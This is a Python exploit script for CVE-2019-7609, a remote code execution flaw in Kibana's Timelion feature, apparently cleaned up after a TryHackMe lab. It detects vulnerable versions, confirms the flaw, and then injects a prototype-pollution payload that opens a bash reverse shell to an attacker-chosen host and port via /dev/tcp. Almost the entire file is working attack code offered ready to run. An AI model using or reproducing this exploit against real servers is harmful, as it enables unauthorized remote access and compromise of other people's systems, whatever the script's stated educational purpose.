#!/usr/bin/env python3
# CVE-2019-7609 Kibana RCE (Fixed)
# Original script by LandGrey: https://github.com/LandGrey/CVE-2019-7609
# Fixed and cleaned by Darren Smith after testing on TryHackMe (Kiba room)
# Fix: TypeError caused by re.findall() on bytes object
# For educational and authorized testing only

import re
import sys
import time
import random
import argparse
import requests
import traceback
from distutils.version import StrictVersion
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_kibana_version(url):
    headers = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    endpoint = f"{url.rstrip('/')}/app/kibana"
    r = requests.get(endpoint, verify=False, headers=headers, timeout=30)
    
    # FIXED: decode response before regex
    content = r.text

    patterns = ['&quot;version&quot;:&quot;(.*?)&quot;,', '"version":"(.*?)"']
    for pattern in patterns:
        match = re.findall(pattern, content)
        if match:
            return match[0]
    return None

def version_compare(allowed_range, target_version):
    try:
        lower = StrictVersion(allowed_range[0])
        upper = StrictVersion(allowed_range[1])
        target = StrictVersion(target_version)
    except Exception:
        return False
    return (lower <= target < upper) or target <= StrictVersion("5.6.15")

def verify_vulnerability(url, version):
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': url,
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0',
    }
    data = '{"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}'
    endpoint = f"{url.rstrip('/')}/api/timelion/run"
    r = requests.post(endpoint, data=data, verify=False, headers=headers, timeout=20)
    return r.status_code == 200 and 'application/json' in r.headers.get('content-type', '') and '"seriesList"' in r.text

def reverse_shell(target, version, lhost, lport):
    rand = "".join(random.sample('qwertyuiopasdfghjkl', 8))
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0',
    }
    payload = r'''{{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/{0} ]; then touch /tmp/{0} && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/{1}/{2} 0>&1\\'; fi\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}}}'''.format(rand, lhost, lport)
    r1 = requests.post(f"{target}/api/timelion/run", data=payload, verify=False, headers=headers, timeout=20)
    if r1.status_code == 200:
        trigger = f"{target}/socket.io/?EIO=3&transport=polling&t={random.randint(100000,999999)}"
        headers['kbn-xsrf'] = 'trigger'
        r2 = requests.get(trigger, headers=headers, verify=False, timeout=20)
        if r2.status_code == 200:
            time.sleep(5)
            return True
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Target Kibana URL")
    parser.add_argument("-host", dest="lhost", default="127.0.0.1", help="Your IP for reverse shell")
    parser.add_argument("-port", dest="lport", default="4444", help="Your port for reverse shell")
    parser.add_argument("--shell", action="store_true", help="Trigger reverse shell if vulnerable")
    args = parser.parse_args()

    target = args.url
    if not target.startswith("http"):
        target = "http://" + target

    print(f"[+] Target: {target}")
    version = get_kibana_version(target)
    if not version:
        print("[-] Could not detect version")
        sys.exit(1)

    print(f"[+] Detected Kibana version: {version}")

    if not version_compare(["6.0.0", "6.6.1"], version):
        print("[-] Version not vulnerable")
        sys.exit(0)

    if verify_vulnerability(target, version):
        print("[+] Target appears vulnerable to CVE-2019-7609!")
        if args.shell:
            print(f"[+] Attempting reverse shell to {args.lhost}:{args.lport}...")
            if reverse_shell(target, version, args.lhost, args.lport):
                print("[+] Reverse shell triggered â€” check your listener.")
            else:
                print("[-] Exploit sent, but no shell received.")
    else:
        print("[-] Target does not appear vulnerable.")

if __name__ == "__main__":
    try:
        main()
    except Exception:
        print("[-] Something went wrong")
        traceback.print_exc()
